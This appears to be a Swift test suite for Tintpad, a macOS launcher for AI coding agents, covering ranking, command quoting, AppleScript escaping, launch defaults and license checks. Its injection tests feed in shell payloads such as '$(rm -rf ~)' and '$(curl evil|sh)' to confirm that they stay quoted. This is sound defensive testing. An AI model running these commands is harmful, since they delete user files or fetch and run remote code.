import XCTest
@testable import Tintpad

final class FrecencyTests: XCTestCase {
    func testDecayHalvesAfterOneHalfLife() {
        var repo = Repo(path: "/x", name: "x")
        let now = Date(timeIntervalSince1970: 1_000_000)
        repo.frecencyScore = 8
        repo.lastLaunchedAt = now
        let later = now.addingTimeInterval(86_400 * 10) // 10 days = one half-life
        let decayed = Frecency.decayedScore(repo, now: later, halfLifeDays: 10)
        XCTAssertEqual(decayed, 4, accuracy: 0.001)
    }

    func testEqualScoresBreakTieByRecencyThenName() {
        let now = Date(timeIntervalSince1970: 1_000_000)
        // Equal score (0, never launched) → sort by name.
        var c = Repo(path: "/c", name: "charlie")
        var a = Repo(path: "/a", name: "alpha")
        let ordered = Frecency.ordered([c, a], now: now, halfLifeDays: 30)
        XCTAssertEqual(ordered.map(\.name), ["alpha", "charlie"])
        // Same score but one launched more recently → it comes first.
        a.frecencyScore = 1; a.lastLaunchedAt = now.addingTimeInterval(-100)
        c.frecencyScore = 1; c.lastLaunchedAt = now.addingTimeInterval(-10)
        XCTAssertEqual(Frecency.ordered([a, c], now: now, halfLifeDays: 30).map(\.name), ["charlie", "alpha"])
    }

    // Guards the arrow-nav-jumping regression: the list order must not change as
    // time ticks (a non-transitive epsilon comparator made it reshuffle per render).
    func testOrderingStableAcrossTimeJitter() {
        let now = Date(timeIntervalSince1970: 2_000_000)
        var repos = ["alpha", "bravo", "charlie", "delta", "echo"].map { Repo(path: "/\($0)", name: $0) }
        repos[1].frecencyScore = 3; repos[1].lastLaunchedAt = now.addingTimeInterval(-3600)
        repos[3].frecencyScore = 3; repos[3].lastLaunchedAt = now.addingTimeInterval(-3600) // ties bravo
        let a = Frecency.ordered(repos, now: now, halfLifeDays: 30).map(\.name)
        let b = Frecency.ordered(repos, now: now.addingTimeInterval(1.5), halfLifeDays: 30).map(\.name)
        XCTAssertEqual(a, b, "frecency order must be stable as time advances")
    }

    // A future-dated anchor (clock rollback, restored backup) must decay to
    // at most the stored score, never amplify it.
    func testFutureDatedAnchorDoesNotInflate() {
        var repo = Repo(path: "/x", name: "x")
        let now = Date(timeIntervalSince1970: 1_000_000)
        repo.frecencyScore = 2
        repo.lastLaunchedAt = now.addingTimeInterval(86_400 * 30)   // 30 days ahead
        XCTAssertEqual(Frecency.decayedScore(repo, now: now, halfLifeDays: 10), 2, accuracy: 0.001)
    }

    func testRecordVisitIncrementsAndReanchors() {
        var repo = Repo(path: "/x", name: "x")
        let now = Date(timeIntervalSince1970: 2_000_000)
        Frecency.recordVisit(&repo, now: now, halfLifeDays: 30)
        XCTAssertEqual(repo.launchCount, 1)
        XCTAssertEqual(repo.frecencyScore, 1, accuracy: 0.001)
        XCTAssertEqual(repo.lastLaunchedAt, now)
        // Same-instant second visit accumulates to 2.
        Frecency.recordVisit(&repo, now: now, halfLifeDays: 30)
        XCTAssertEqual(repo.frecencyScore, 2, accuracy: 0.001)
    }
}

final class CommandTemplateTests: XCTestCase {
    private func ctx(mode: RunMode, prompt: String?) -> CommandTemplate.Context {
        CommandTemplate.Context(repo: Repo(path: "/Users/me/acme", name: "acme"),
                                mode: mode, prompt: prompt, branch: "main", remote: nil)
    }

    func testModeAndNameSubstitution() {
        let yolo = RunMode(name: "YOLO", flags: "--dangerously-skip-permissions", isDangerous: true, description: "")
        let out = CommandTemplate.preview("claude {mode}", context: ctx(mode: yolo, prompt: nil))
        XCTAssertEqual(out, "claude --dangerously-skip-permissions")
    }

    func testEmptyModeCollapsesSpaces() {
        let out = CommandTemplate.preview("claude {mode} {prompt}", context: ctx(mode: .defaultMode(), prompt: nil))
        XCTAssertEqual(out, "claude")
    }

    // The empty-slot cleanup must never rewrite spaces inside quoted values:
    // "/Users/me/my  repo" is a legal path and must survive verbatim.
    func testDoubleSpacesInsideQuotedValuesSurvive() {
        let repo = Repo(path: "/Users/me/my  repo", name: "my  repo")
        let c = CommandTemplate.Context(repo: repo, mode: .defaultMode(),
                                        prompt: "fix  this", branch: nil, remote: nil)
        let out = CommandTemplate.preview("cd {repoPath} && claude {mode} {prompt}", context: c)
        XCTAssertEqual(out, "cd '/Users/me/my  repo' && claude 'fix  this'")
    }

    func testPromptIsQuoted() {
        let out = CommandTemplate.preview("claude {prompt}", context: ctx(mode: .defaultMode(), prompt: "fix bug"))
        XCTAssertEqual(out, "claude 'fix bug'")
    }

    func testRepoNameAndPathQuoted() {
        let out = CommandTemplate.preview("cd {repoPath} # {repoName}", context: ctx(mode: .defaultMode(), prompt: nil))
        XCTAssertEqual(out, "cd '/Users/me/acme' # 'acme'")
    }

    // S1: an adversarial repo/branch name cannot escape the single-quoted argument.
    func testInjectionViaRepoNameNeutralized() {
        var repo = Repo(path: "/x", name: "$(rm -rf ~); echo pwned")
        let c = CommandTemplate.Context(repo: repo, mode: .defaultMode(), prompt: nil, branch: nil, remote: nil)
        let out = CommandTemplate.preview("claude {repoName}", context: c)
        XCTAssertEqual(out, "claude '$(rm -rf ~); echo pwned'")
        XCTAssertFalse(out.contains("') ") || out.contains("';"))  // no quote-break
        _ = repo
    }

    func testSingleQuoteInValueEscaped() {
        let c = CommandTemplate.Context(repo: Repo(path: "/x", name: "x"),
                                        mode: .defaultMode(), prompt: "it's fine", branch: nil, remote: nil)
        let out = CommandTemplate.preview("claude {prompt}", context: c)
        XCTAssertEqual(out, "claude 'it'\\''s fine'")
    }

    // S2: newlines/control chars are stripped so they can't submit early or break AppleScript.
    func testNewlinesStrippedFromPrompt() {
        let c = CommandTemplate.Context(repo: Repo(path: "/x", name: "x"),
                                        mode: .defaultMode(), prompt: "line1\nrm -rf ~\ttab", branch: nil, remote: nil)
        let out = CommandTemplate.preview("claude {prompt}", context: c)
        XCTAssertFalse(out.contains("\n"))
        XCTAssertFalse(out.contains("\t"))
        XCTAssertEqual(out, "claude 'line1 rm -rf ~ tab'")
    }

    // S2: a .git/HEAD or .git/config with adversarial content flows into {branch}/{remote};
    // both must be single-quoted just like repo path/name.
    func testBranchAndRemoteQuoted() {
        let c = CommandTemplate.Context(
            repo: Repo(path: "/x", name: "x"), mode: .defaultMode(), prompt: nil,
            branch: "a'; rm -rf ~ #", remote: "$(curl evil|sh)", worktreePath: nil)
        let out = CommandTemplate.preview("claude --branch {branch} --remote {remote}", context: c)
        // The injected `'` is escaped as '\'' so the rm/curl payloads stay inside single quotes.
        XCTAssertEqual(out, "claude --branch 'a'\\''; rm -rf ~ #' --remote '$(curl evil|sh)'")
    }
}

// S2: the AppleScript escaping layer (iTerm2 / Terminal.app `do script "…"`) was untested.
final class AppleScriptEscapeTests: XCTestCase {
    func testDoubleQuoteEscaped() {
        XCTAssertEqual(appleScriptEscape("say \"hi\""), "say \\\"hi\\\"")
    }

    func testBackslashEscapedBeforeQuote() {
        // A backslash-then-quote must become \\ then \" — not \\" (which would be backslash + literal quote).
        XCTAssertEqual(appleScriptEscape("a\\\"b"), "a\\\\\\\"b")
    }

    func testNewlineAndCarriageReturnCollapsed() {
        XCTAssertEqual(appleScriptEscape("a\nb\rc"), "a b c")
        XCTAssertFalse(appleScriptEscape("x\ny").contains("\n"))
    }

    // End-to-end: an adversarial branch survives shell single-quoting, then the assembled
    // `cd 'wd' && cmd` is AppleScript-escaped with no unescaped double quote left to break the literal.
    func testEndToEndShellThenAppleScriptNoUnescapedQuote() {
        let c = CommandTemplate.Context(
            repo: Repo(path: "/Users/me/acme", name: "acme"), mode: .defaultMode(),
            prompt: "say \"done\"", branch: "a\"b", remote: nil, worktreePath: nil)
        let command = CommandTemplate.preview("claude --branch {branch} {prompt}", context: c)
        let assembled = "cd '/Users/me/acme' && \(command)"
        let escaped = appleScriptEscape(assembled)
        // Every literal double quote in the assembled command must be backslash-escaped.
        var prev: Character = " "
        for ch in escaped {
            if ch == "\"" { XCTAssertEqual(prev, "\\", "unescaped double quote in AppleScript literal: \(escaped)") }
            prev = ch
        }
    }
}

final class LaunchDefaultsTests: XCTestCase {
    private let safe = RunMode(name: "Safe", flags: "", isDangerous: false, description: "")
    private let def = RunMode.defaultMode()
    private let yolo = RunMode(name: "YOLO", flags: "--yolo", isDangerous: true, description: "")

    private func makeAgent(_ name: String) -> Agent {
        Agent(name: name, commandTemplate: "\(name) {mode}", acceptsPrompt: true, tintHex: nil,
              symbol: "terminal", modes: [safe, def, yolo], defaultModeID: def.id)
    }

    func testPinnedModeWinsOverLastUsedAndAgentDefault() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.defaultModeID = yolo.id
        repo.lastModeID = safe.id
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent).id, yolo.id)
    }

    func testLastUsedModeWinsOverAgentDefault() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.lastModeID = yolo.id
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent).id, yolo.id)
    }

    func testStaleLastModeFromAnotherAgentFallsThrough() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.lastModeID = UUID()   // a mode that belongs to no current agent
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent).id, def.id)
    }

    func testOverrideBeatsEverything() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.defaultModeID = yolo.id
        repo.lastModeID = yolo.id
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent, overrideID: safe.id).id, safe.id)
    }

    func testAgentPrecedencePinnedThenLastUsedThenFirst() {
        let claude = makeAgent("claude")
        let codex = makeAgent("codex")
        var repo = Repo(path: "/x", name: "x")
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude, codex])?.id, claude.id)
        repo.lastAgentID = codex.id
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude, codex])?.id, codex.id)
        repo.defaultAgentID = claude.id
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude, codex])?.id, claude.id)
    }

    func testRemovedLastAgentFallsBackToFirst() {
        let claude = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.lastAgentID = UUID()   // agent since deleted
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude])?.id, claude.id)
    }
}

final class LaunchResolutionTests: XCTestCase {
    private func agent(_ template: String) -> Agent {
        Agent(name: "T", commandTemplate: template, acceptsPrompt: true, tintHex: nil,
              symbol: "terminal", modes: [.defaultMode()], defaultModeID: nil)
    }

    func testMakeLaunchResolvesCommandAndWorkingDir() throws {
        // A "/"-prefixed binary is trusted as-is, so resolution is deterministic.
        let mode = RunMode(name: "YOLO", flags: "--go", isDangerous: true, description: "")
        var s = Settings(); s.openInNewTab = false
        let launch = try LaunchService.makeLaunch(
            repo: Repo(path: "/tmp/acme", name: "acme"), agent: agent("/bin/echo {mode} {prompt}"),
            mode: mode, prompt: "fix it", worktreePath: nil, settings: s)
        XCTAssertEqual(launch.workingDirectory, "/tmp/acme")
        XCTAssertEqual(launch.command, "/bin/echo --go 'fix it'")
        XCTAssertFalse(launch.openInTab)
    }

    func testMakeLaunchHonorsTabSettingAndWorktree() throws {
        var s = Settings(); s.openInNewTab = true
        let launch = try LaunchService.makeLaunch(
            repo: Repo(path: "/tmp/acme", name: "acme"), agent: agent("/bin/echo"),
            mode: .defaultMode(), prompt: nil, worktreePath: "/tmp/wt/feature", settings: s)
        XCTAssertTrue(launch.openInTab)
        XCTAssertEqual(launch.workingDirectory, "/tmp/wt/feature")
        XCTAssertEqual(launch.command, "/bin/echo")
    }
}

final class ErrorMessageTests: XCTestCase {
    func testFriendlyLocalizedDescriptions() {
        XCTAssertEqual((TerminalLaunchError.notInstalled as LocalizedError).errorDescription,
                       "That terminal isn't installed.")
        let resolve = CommandTemplate.ResolveError.binaryNotFound("claude")
        XCTAssertEqual((resolve as LocalizedError).errorDescription,
                       "“claude” isn’t on your PATH — check it’s installed, then Re-scan.")
        // No raw "error N" Swift boilerplate leaks through.
        XCTAssertFalse((resolve as Error).localizedDescription.contains("error "))
    }
}

final class LicenseTests: XCTestCase {
    // The sample Pro key signed by the embedded public key (see secrets/).
    private let validKey = "eyJlbWFpbCI6ImVyaWtAc29ya2lsYS5jb20iLCJwbGFuIjoicHJvIiwiaWF0IjoxNzUwMDAwMDAwfQ==.HqALR7nuRgB6AeUq7daHFd33+ESLZn2qdMbMaKk1FwoIAACRxgs5rSXdkG2A2bxPXGJ4g1jRCNrQJ2LS08DeCQ=="

    func testValidKeyAccepted() {
        let info = LicenseManager.verify(validKey)
        XCTAssertEqual(info?.plan, "pro")
        XCTAssertEqual(info?.email, "erik@sorkila.com")
    }

    func testNilAndGarbageRejected() {
        XCTAssertNil(LicenseManager.verify(nil))
        XCTAssertNil(LicenseManager.verify(""))
        XCTAssertNil(LicenseManager.verify("not-a-key"))
        XCTAssertNil(LicenseManager.verify("a.b"))
    }

    func testTamperedSignatureRejected() {
        var bad = validKey
        let dot = bad.firstIndex(of: ".")!
        let after = bad.index(after: dot)
        bad.replaceSubrange(after...after, with: bad[after] == "H" ? "I" : "H")
        XCTAssertNil(LicenseManager.verify(bad))
    }
}

final class GitInfoTests: XCTestCase {
    func testParsesBranchAndRemote() throws {
        let dir = NSTemporaryDirectory() + "tintpad-gittest-\(UUID().uuidString)"
        let git = dir + "/.git"
        try FileManager.default.createDirectory(atPath: git, withIntermediateDirectories: true)
        try "ref: refs/heads/feature/x\n".write(toFile: git + "/HEAD", atomically: true, encoding: .utf8)
        try """
        [core]
            bare = false
        [remote "origin"]
            url = git@github.com:me/acme.git
        """.write(toFile: git + "/config", atomically: true, encoding: .utf8)

        let meta = GitInfo.read(at: dir)
        XCTAssertEqual(meta.branch, "x")  // last path component of refs/heads/feature/x
        XCTAssertEqual(meta.remoteURL, "git@github.com:me/acme.git")
        try? FileManager.default.removeItem(atPath: dir)
    }
}

final class GitStatusTests: XCTestCase {
    private func sh(_ args: [String], cwd: String) {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: "/usr/bin/git")
        p.arguments = args
        p.currentDirectoryURL = URL(fileURLWithPath: cwd)
        try? p.run(); p.waitUntilExit()
    }

    func testCleanDirtyAndNonRepo() throws {
        try XCTSkipUnless(FileManager.default.isExecutableFile(atPath: "/usr/bin/git"))
        let dir = NSTemporaryDirectory() + "tintpad-dirty-\(UUID().uuidString)"
        try FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: dir) }

        // Not a repo yet → unknown, never a guess.
        XCTAssertNil(GitStatus.isDirty(at: dir))

        sh(["init", "-q"], cwd: dir)
        sh(["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init"], cwd: dir)
        XCTAssertEqual(GitStatus.isDirty(at: dir), false)

        // An untracked file counts as dirty — that is what the working tree shows.
        FileManager.default.createFile(atPath: dir + "/new.txt", contents: Data("x".utf8))
        XCTAssertEqual(GitStatus.isDirty(at: dir), true)
    }
}

final class RepoDiscoveryTests: XCTestCase {
    func testFindsGitRepos() throws {
        let root = NSTemporaryDirectory() + "tintpad-disc-\(UUID().uuidString)"
        let repo = root + "/myrepo"
        try FileManager.default.createDirectory(atPath: repo + "/.git", withIntermediateDirectories: true)
        try FileManager.default.createDirectory(atPath: root + "/not-a-repo", withIntermediateDirectories: true)

        let found = RepoDiscovery.scan(roots: [root])
        XCTAssertTrue(found.contains { $0.hasSuffix("/myrepo") })
        XCTAssertFalse(found.contains { $0.hasSuffix("/not-a-repo") })
        try? FileManager.default.removeItem(atPath: root)
    }
}

final class MonogramTests: XCTestCase {
    func testUnambiguousNamesGetOneLetter() {
        XCTAssertEqual(Monogram.assign(["Gemini", "Aider", "Codex"]), ["G", "A", "C"])
    }

    func testCollidingNamesGrowAndNonCollidingStaySingle() {
        // Only the C's collide; Gemini keeps its clean single letter.
        let out = Monogram.assign(["Claude Code", "Codex", "Gemini"])
        XCTAssertEqual(out[2], "G")
        XCTAssertNotEqual(out[0], out[1])
        XCTAssertEqual(Set(out).count, 3)
    }

    func testSingleWordCollisionUsesFirstTwoLetters() {
        let out = Monogram.assign(["Codex", "Coder"])
        XCTAssertEqual(Set(out).count, 2, "shared 'Co' prefix must still resolve")
    }

    func testAssignmentIsStableAndOrderPreserving() {
        let names = ["Claude Code", "Codex", "Cursor"]
        XCTAssertEqual(Monogram.assign(names), Monogram.assign(names))
        XCTAssertEqual(Monogram.assign(names).count, names.count)
    }

    func testLeadingNonLettersAndEmptyNames() {
        XCTAssertEqual(Monogram.assign(["  opencode"]), ["O"])
        XCTAssertEqual(Monogram.assign(["!!!"]), ["?"])
    }

    func testOfMatchesAssignForTheSameSet() {
        let names = ["Claude Code", "Codex", "Gemini"]
        let all = Monogram.assign(names)
        for (i, n) in names.enumerated() {
            XCTAssertEqual(Monogram.of(n, in: names), all[i])
        }
    }
}

final class RepoTintTests: XCTestCase {
    func testHueIsDeterministicAndInRange() {
        for name in ["Tintpad", "Kuta", "Velm", "SB3K", "The Prototype Lab"] {
            let h = RepoTint.hue(for: name)
            XCTAssertEqual(h, RepoTint.hue(for: name), "hue must be stable")
            XCTAssertGreaterThanOrEqual(h, 20)
            XCTAssertLessThan(h, 340, "danger-red band is reserved")
        }
    }

    func testCaseInsensitive() {
        XCTAssertEqual(RepoTint.hue(for: "Kuta"), RepoTint.hue(for: "kuta"))
    }

    func testShortNames() {
        XCTAssertEqual(RepoTint.shortName(for: "Kuta"), "KUTA")       // fits whole
        XCTAssertEqual(RepoTint.shortName(for: "SB3K"), "SB3K")
        XCTAssertEqual(RepoTint.shortName(for: "Tintpad"), "TIN")     // prefix
        XCTAssertEqual(RepoTint.shortName(for: "The Prototype Lab"), "TPL")  // initials
        XCTAssertEqual(RepoTint.shortName(for: "my-cool-repo"), "MCR")
        XCTAssertEqual(RepoTint.shortName(for: ""), "?")
    }
}

final class KeyPolicyTests: XCTestCase {
    func testTabIsOursWhenNoAssistiveTechIsActive() {
        XCTAssertFalse(KeyPolicy.tabShouldTraverse(voiceOver: false, fullKeyboardAccess: false),
                       "⇥ should still cycle agents for ordinary keyboard use")
    }

    func testVoiceOverReclaimsTab() {
        XCTAssertTrue(KeyPolicy.tabShouldTraverse(voiceOver: true, fullKeyboardAccess: false))
    }

    func testFullKeyboardAccessReclaimsTab() {
        XCTAssertTrue(KeyPolicy.tabShouldTraverse(voiceOver: false, fullKeyboardAccess: true))
    }
}
